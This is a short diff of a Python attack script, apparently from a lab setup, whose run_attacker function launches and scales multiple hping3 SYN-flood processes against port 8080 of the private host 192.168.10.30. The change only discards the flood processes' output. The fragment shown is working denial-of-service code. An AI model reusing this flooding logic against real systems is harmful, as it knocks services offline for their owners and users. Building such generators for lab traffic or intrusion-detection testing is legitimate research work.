@@ -28,7 +28,8 @@ def run_attacker():
             if new_no_processes > no_processes:
                 print(f"Iniciando {dif_no_processes} procesos de ataque.")
                 for _ in range(dif_no_processes):
-                    processes.append(subprocess.Popen(["hping3", "-S", "--flood", "-V", "-p", "8080", "192.168.10.30"]))
+                    processes.append(subprocess.Popen(["hping3", "-S", "--flood", "-V", "-p", "8080", "192.168.10.30"],
+                                                      stdout=subprocess.DEVNULL))
                 print(f"Se iniciaron {dif_no_processes} procesos de ataque satisfactoriamente.")
             else:
                 print(f"Deteniendo {dif_no_processes} procesos de ataque.")
